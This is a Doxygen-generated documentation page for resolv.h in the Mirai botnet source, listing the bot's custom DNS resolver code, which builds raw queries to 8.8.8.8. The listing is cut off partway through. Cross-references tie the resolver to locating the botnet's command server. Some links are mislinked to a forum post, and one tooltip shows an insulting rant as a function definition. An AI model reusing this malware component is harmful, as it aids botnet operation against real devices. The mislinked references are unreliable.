<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.8.11"/>
<title>Mirai: mirai/bot/resolv.h File Reference</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="resize.js"></script>
<script type="text/javascript" src="navtreedata.js"></script>
<script type="text/javascript" src="navtree.js"></script>
<script type="text/javascript">
  $(document).ready(initResizable);
  $(window).load(resizeHeight);
</script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<script type="text/javascript">
  $(document).ready(function() { init_search(); });
</script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">Mirai
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.8.11 -->
<script type="text/javascript">
var searchBox = new SearchBox("searchBox", "search",false,'Search');
</script>
  <div id="navrow1" class="tabs">
    <ul class="tablist">
      <li><a href="index.html"><span>Main&#160;Page</span></a></li>
      <li><a href="pages.html"><span>Related&#160;Pages</span></a></li>
      <li><a href="annotated.html"><span>Data&#160;Structures</span></a></li>
      <li class="current"><a href="files.html"><span>Files</span></a></li>
      <li>
        <div id="MSearchBox" class="MSearchBoxInactive">
        <span class="left">
          <img id="MSearchSelect" src="search/mag_sel.png"
               onmouseover="return searchBox.OnSearchSelectShow()"
               onmouseout="return searchBox.OnSearchSelectHide()"
               alt=""/>
          <input type="text" id="MSearchField" value="Search" accesskey="S"
               onfocus="searchBox.OnSearchFieldFocus(true)" 
               onblur="searchBox.OnSearchFieldFocus(false)" 
               onkeyup="searchBox.OnSearchFieldChange(event)"/>
          </span><span class="right">
            <a id="MSearchClose" href="javascript:searchBox.CloseResultsWindow()"><img id="MSearchCloseImg" border="0" src="search/close.png" alt=""/></a>
          </span>
        </div>
      </li>
    </ul>
  </div>
  <div id="navrow2" class="tabs2">
    <ul class="tablist">
      <li><a href="files.html"><span>File&#160;List</span></a></li>
      <li><a href="globals.html"><span>Globals</span></a></li>
    </ul>
  </div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
$(document).ready(function(){initNavTree('resolv_8h.html','');});
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

<div class="header">
  <div class="summary">
<a href="#nested-classes">Data Structures</a> &#124;
<a href="#func-members">Functions</a>  </div>
  <div class="headertitle">
<div class="title">resolv.h File Reference</div>  </div>
</div><!--header-->
<div class="contents">
<div class="textblock"><code>#include &quot;<a class="el" href="mirai_2bot_2includes_8h_source.html">includes.h</a>&quot;</code><br />
</div>
<p><a href="resolv_8h_source.html">Go to the source code of this file.</a></p>
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="nested-classes"></a>
Data Structures</h2></td></tr>
<tr class="memitem:"><td class="memItemLeft" align="right" valign="top">struct &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="structresolv__entries.html">resolv_entries</a></td></tr>
<tr class="separator:"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="func-members"></a>
Functions</h2></td></tr>
<tr class="memitem:ade52787a8ded09b2ce907f4e3c5c56ef"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="resolv_8h.html#ade52787a8ded09b2ce907f4e3c5c56ef">resolv_domain_to_hostname</a> (char *, char *)</td></tr>
<tr class="separator:ade52787a8ded09b2ce907f4e3c5c56ef"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a28840567d7f01bcb6fd86b208780e0a9"><td class="memItemLeft" align="right" valign="top">struct <a class="el" href="structresolv__entries.html">resolv_entries</a> *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="resolv_8h.html#a28840567d7f01bcb6fd86b208780e0a9">resolv_lookup</a> (char *)</td></tr>
<tr class="separator:a28840567d7f01bcb6fd86b208780e0a9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a98221bb11b109f49062aa8b24a8b0fe8"><td class="memItemLeft" align="right" valign="top">void&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="resolv_8h.html#a98221bb11b109f49062aa8b24a8b0fe8">resolv_entries_free</a> (struct <a class="el" href="structresolv__entries.html">resolv_entries</a> *)</td></tr>
<tr class="separator:a98221bb11b109f49062aa8b24a8b0fe8"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<h2 class="groupheader">Function Documentation</h2>
<a class="anchor" id="ade52787a8ded09b2ce907f4e3c5c56ef"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void resolv_domain_to_hostname </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="resolv_8c_source.html#l00021">21</a> of file <a class="el" href="resolv_8c_source.html">resolv.c</a>.</p>

<p>References <a class="el" href="mirai_2bot_2util_8c_source.html#l00021">util_strlen()</a>.</p>

<p>Referenced by <a class="el" href="resolv_8c_source.html#l00067">resolv_lookup()</a>.</p>
<div class="fragment"><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;{</div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;    <span class="keywordtype">int</span> len = <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(src_domain) + 1;</div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;    <span class="keywordtype">char</span> *lbl = dst_hostname, *dst_pos = dst_hostname + 1;</div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;    uint8_t curr_len = 0;</div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;</div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;    <span class="keywordflow">while</span> (len-- &gt; 0)</div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;    {</div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;        <span class="keywordtype">char</span> c = *src_domain++;</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;        <span class="keywordflow">if</span> (c == <span class="charliteral">&#39;.&#39;</span> || c == 0)</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;        {</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;            *lbl = curr_len;</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;            lbl = dst_pos++;</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;            curr_len = 0;</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;        }</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;        <span class="keywordflow">else</span></div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;        {</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;            curr_len++;</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;            *dst_pos++ = c;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;        }</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;    }</div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;    *dst_pos = 0;</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;}</div><div class="ttc" id="mirai_2bot_2util_8c_html_a181a242a15f441fe3eefe68330b0c8e3"><div class="ttname"><a href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a></div><div class="ttdeci">int util_strlen(char *str)</div><div class="ttdef"><b>Definition:</b> <a href="mirai_2bot_2util_8c_source.html#l00021">util.c:21</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a98221bb11b109f49062aa8b24a8b0fe8"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void resolv_entries_free </td>
          <td>(</td>
          <td class="paramtype">struct <a class="el" href="structresolv__entries.html">resolv_entries</a> *&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="resolv_8c_source.html#l00230">230</a> of file <a class="el" href="resolv_8c_source.html">resolv.c</a>.</p>

<p>References <a class="el" href="resolv_8h_source.html#l00007">resolv_entries::addrs</a>, and <a class="el" href="ForumPost_8txt_source.html#l00030">free</a>.</p>

<p>Referenced by <a class="el" href="resolv_8c_source.html#l00067">resolv_lookup()</a>, and <a class="el" href="mirai_2bot_2main_8c_source.html#l00358">resolve_cnc_addr()</a>.</p>
<div class="fragment"><div class="line"><a name="l00231"></a><span class="lineno">  231</span>&#160;{</div><div class="line"><a name="l00232"></a><span class="lineno">  232</span>&#160;    <span class="keywordflow">if</span> (entries == NULL)</div><div class="line"><a name="l00233"></a><span class="lineno">  233</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00234"></a><span class="lineno">  234</span>&#160;    <span class="keywordflow">if</span> (entries-&gt;addrs != NULL)</div><div class="line"><a name="l00235"></a><span class="lineno">  235</span>&#160;        <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(entries-&gt;addrs);</div><div class="line"><a name="l00236"></a><span class="lineno">  236</span>&#160;    <a class="code" href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a>(entries);</div><div class="line"><a name="l00237"></a><span class="lineno">  237</span>&#160;}</div><div class="ttc" id="ForumPost_8txt_html_ab292715cb198b54d1912ed6209d567dc"><div class="ttname"><a href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be free</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00030">ForumPost.txt:30</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="a28840567d7f01bcb6fd86b208780e0a9"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">struct <a class="el" href="structresolv__entries.html">resolv_entries</a>* resolv_lookup </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Definition at line <a class="el" href="resolv_8c_source.html#l00067">67</a> of file <a class="el" href="resolv_8c_source.html">resolv.c</a>.</p>

<p>References <a class="el" href="protocol_8h_source.html#l00016">dns_resource::_class</a>, <a class="el" href="resolv_8h_source.html#l00007">resolv_entries::addrs</a>, <a class="el" href="resolv_8h_source.html#l00006">resolv_entries::addrs_len</a>, <a class="el" href="protocol_8h_source.html#l00008">dnshdr::ancount</a>, <a class="el" href="wget_8c_source.html#l00052">close</a>, <a class="el" href="ForumPost_8txt_source.html#l00001">connect</a>, <a class="el" href="protocol_8h_source.html#l00018">dns_resource::data_len</a>, <a class="el" href="protocol_8h_source.html#l00008">dnshdr::id</a>, <a class="el" href="mirai_2bot_2includes_8h_source.html#l00018">INET_ADDR</a>, <a class="el" href="protocol_8h_source.html#l00008">dnshdr::opts</a>, <a class="el" href="protocol_8h_source.html#l00026">PROTO_DNS_QCLASS_IP</a>, <a class="el" href="protocol_8h_source.html#l00025">PROTO_DNS_QTYPE_A</a>, <a class="el" href="protocol_8h_source.html#l00012">dns_question::qclass</a>, <a class="el" href="protocol_8h_source.html#l00008">dnshdr::qdcount</a>, <a class="el" href="protocol_8h_source.html#l00012">dns_question::qtype</a>, <a class="el" href="rand_8c_source.html#l00021">rand_next()</a>, <a class="el" href="resolv_8c_source.html#l00021">resolv_domain_to_hostname()</a>, <a class="el" href="resolv_8c_source.html#l00230">resolv_entries_free()</a>, <a class="el" href="resolv_8c_source.html#l00046">resolv_skip_name()</a>, <a class="el" href="wget_8c_source.html#l00047">socket</a>, <a class="el" href="protocol_8h_source.html#l00016">dns_resource::type</a>, <a class="el" href="mirai_2bot_2util_8c_source.html#l00021">util_strlen()</a>, and <a class="el" href="mirai_2bot_2util_8c_source.html#l00080">util_zero()</a>.</p>

<p>Referenced by <a class="el" href="mirai_2bot_2main_8c_source.html#l00358">resolve_cnc_addr()</a>.</p>
<div class="fragment"><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;{</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;    <span class="keyword">struct </span><a class="code" href="structresolv__entries.html">resolv_entries</a> *entries = calloc(1, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structresolv__entries.html">resolv_entries</a>));</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;    <span class="keywordtype">char</span> query[2048], response[2048];</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;    <span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a> *dnsh = (<span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a> *)query;</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;    <span class="keywordtype">char</span> *qname = (<span class="keywordtype">char</span> *)(dnsh + 1);</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;    <a class="code" href="resolv_8c.html#a34ff8173133c46ba5f52a187392bb1db">resolv_domain_to_hostname</a>(qname, <a class="code" href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a>);</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;    <span class="keyword">struct </span><a class="code" href="structdns__question.html">dns_question</a> *dnst = (<span class="keyword">struct </span><a class="code" href="structdns__question.html">dns_question</a> *)(qname + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(qname) + 1);</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;    <span class="keyword">struct </span>sockaddr_in addr = {0};</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;    <span class="keywordtype">int</span> query_len = <span class="keyword">sizeof</span> (<span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a>) + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(qname) + 1 + sizeof (struct <a class="code" href="structdns__question.html">dns_question</a>);</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;    <span class="keywordtype">int</span> tries = 0, fd = -1, i = 0;</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;    uint16_t dns_id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() % 0xffff;</div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;    <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(&amp;addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in));</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;    addr.sin_family = AF_INET;</div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;    addr.sin_addr.s_addr = <a class="code" href="mirai_2bot_2includes_8h.html#a31dbe0466c76698ccd7b518deec33c7c">INET_ADDR</a>(8,8,8,8);</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;    addr.sin_port = htons(53);</div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;    <span class="comment">// Set up the dns query</span></div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;    dnsh-&gt;<a class="code" href="structdnshdr.html#a72d8ea566565d7c17e1cda9a6260be0b">id</a> = dns_id;</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;    dnsh-&gt;<a class="code" href="structdnshdr.html#acfe83574de35456f80abcbc7d0fe8472">opts</a> = htons(1 &lt;&lt; 8); <span class="comment">// Recursion desired</span></div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;    dnsh-&gt;<a class="code" href="structdnshdr.html#a85cb57fcbd654e84d28c30e5bfa844c4">qdcount</a> = htons(1);</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;    dnst-&gt;<a class="code" href="structdns__question.html#a28612cf31ea9061817c7652d97f68f10">qtype</a> = htons(<a class="code" href="protocol_8h.html#a83ac410cc49f839586f7c3f67c82a8fd">PROTO_DNS_QTYPE_A</a>);</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;    dnst-&gt;<a class="code" href="structdns__question.html#afe96f7c0e33a7f83e289140633217017">qclass</a> = htons(<a class="code" href="protocol_8h.html#a901b19f9dfb79c07984d5f8bf8b2a62c">PROTO_DNS_QCLASS_IP</a>);</div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;    <span class="keywordflow">while</span> (tries++ &lt; 5)</div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;    {</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;        fd_set fdset;</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;        <span class="keyword">struct </span>timeval timeo;</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;        <span class="keywordtype">int</span> nfds;</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;</div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;        <span class="keywordflow">if</span> (fd != -1)</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;            <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(fd);</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;        <span class="keywordflow">if</span> ((fd = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_DGRAM, 0)) == -1)</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;        {</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;            printf(<span class="stringliteral">&quot;[resolv] Failed to create socket\n&quot;</span>);</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;            sleep(1);</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;        }</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;        <span class="keywordflow">if</span> (<a class="code" href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a>(fd, (<span class="keyword">struct</span> sockaddr *)&amp;addr, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr_in)) == -1)</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;        {</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;            printf(<span class="stringliteral">&quot;[resolv] Failed to call connect on udp socket\n&quot;</span>);</div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;            sleep(1);</div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;        }</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;        <span class="keywordflow">if</span> (send(fd, query, query_len, MSG_NOSIGNAL) == -1)</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;        {</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;            printf(<span class="stringliteral">&quot;[resolv] Failed to send packet: %d\n&quot;</span>, errno);</div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;            sleep(1);</div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;        }</div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;</div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));</div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;        FD_ZERO(&amp;fdset);</div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;        FD_SET(fd, &amp;fdset);</div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;</div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;        timeo.tv_sec = 5;</div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;        timeo.tv_usec = 0;</div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;        nfds = select(fd + 1, &amp;fdset, NULL, NULL, &amp;timeo);</div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;</div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;        <span class="keywordflow">if</span> (nfds == -1)</div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;        {</div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;            printf(<span class="stringliteral">&quot;[resolv] select() failed\n&quot;</span>);</div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;        }</div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;        <span class="keywordflow">else</span> <span class="keywordflow">if</span> (nfds == 0)</div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;        {</div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;            printf(<span class="stringliteral">&quot;[resolv] Couldn&#39;t resolve %s in time. %d tr%s\n&quot;</span>, <a class="code" href="ForumPost_8txt.html#ae4b9f60da1e934a3855a3b52163fa058">domain</a>, tries, tries == 1 ? <span class="stringliteral">&quot;y&quot;</span> : <span class="stringliteral">&quot;ies&quot;</span>);</div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;        }</div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;        <span class="keywordflow">else</span> <span class="keywordflow">if</span> (FD_ISSET(fd, &amp;fdset))</div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;        {</div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00154"></a><span class="lineno">  154</span>&#160;            printf(<span class="stringliteral">&quot;[resolv] Got response from select\n&quot;</span>);</div><div class="line"><a name="l00155"></a><span class="lineno">  155</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00156"></a><span class="lineno">  156</span>&#160;            <span class="keywordtype">int</span> ret = recvfrom(fd, response, <span class="keyword">sizeof</span> (response), MSG_NOSIGNAL, NULL, NULL);</div><div class="line"><a name="l00157"></a><span class="lineno">  157</span>&#160;            <span class="keywordtype">char</span> *name;</div><div class="line"><a name="l00158"></a><span class="lineno">  158</span>&#160;            <span class="keyword">struct </span>dnsans *dnsa;</div><div class="line"><a name="l00159"></a><span class="lineno">  159</span>&#160;            uint16_t ancount;</div><div class="line"><a name="l00160"></a><span class="lineno">  160</span>&#160;            <span class="keywordtype">int</span> stop;</div><div class="line"><a name="l00161"></a><span class="lineno">  161</span>&#160;</div><div class="line"><a name="l00162"></a><span class="lineno">  162</span>&#160;            <span class="keywordflow">if</span> (ret &lt; (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdnshdr.html">dnshdr</a>) + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(qname) + 1 + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structdns__question.html">dns_question</a>)))</div><div class="line"><a name="l00163"></a><span class="lineno">  163</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00164"></a><span class="lineno">  164</span>&#160;</div><div class="line"><a name="l00165"></a><span class="lineno">  165</span>&#160;            dnsh = (<span class="keyword">struct </span><a class="code" href="structdnshdr.html">dnshdr</a> *)response;</div><div class="line"><a name="l00166"></a><span class="lineno">  166</span>&#160;            qname = (<span class="keywordtype">char</span> *)(dnsh + 1);</div><div class="line"><a name="l00167"></a><span class="lineno">  167</span>&#160;            dnst = (<span class="keyword">struct </span><a class="code" href="structdns__question.html">dns_question</a> *)(qname + <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(qname) + 1);</div><div class="line"><a name="l00168"></a><span class="lineno">  168</span>&#160;            name = (<span class="keywordtype">char</span> *)(dnst + 1);</div><div class="line"><a name="l00169"></a><span class="lineno">  169</span>&#160;</div><div class="line"><a name="l00170"></a><span class="lineno">  170</span>&#160;            <span class="keywordflow">if</span> (dnsh-&gt;<a class="code" href="structdnshdr.html#a72d8ea566565d7c17e1cda9a6260be0b">id</a> != dns_id)</div><div class="line"><a name="l00171"></a><span class="lineno">  171</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00172"></a><span class="lineno">  172</span>&#160;            <span class="keywordflow">if</span> (dnsh-&gt;<a class="code" href="structdnshdr.html#a4951db0facef059a5df0879eaa251f33">ancount</a> == 0)</div><div class="line"><a name="l00173"></a><span class="lineno">  173</span>&#160;                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00174"></a><span class="lineno">  174</span>&#160;</div><div class="line"><a name="l00175"></a><span class="lineno">  175</span>&#160;            ancount = ntohs(dnsh-&gt;<a class="code" href="structdnshdr.html#a4951db0facef059a5df0879eaa251f33">ancount</a>);</div><div class="line"><a name="l00176"></a><span class="lineno">  176</span>&#160;            <span class="keywordflow">while</span> (ancount-- &gt; 0)</div><div class="line"><a name="l00177"></a><span class="lineno">  177</span>&#160;            {</div><div class="line"><a name="l00178"></a><span class="lineno">  178</span>&#160;                <span class="keyword">struct </span><a class="code" href="structdns__resource.html">dns_resource</a> *r_data = NULL;</div><div class="line"><a name="l00179"></a><span class="lineno">  179</span>&#160;</div><div class="line"><a name="l00180"></a><span class="lineno">  180</span>&#160;                <a class="code" href="resolv_8c.html#ab3297f1db6e1da895a374bd7e476a3d2">resolv_skip_name</a>(name, response, &amp;stop);</div><div class="line"><a name="l00181"></a><span class="lineno">  181</span>&#160;                name = name + stop;</div><div class="line"><a 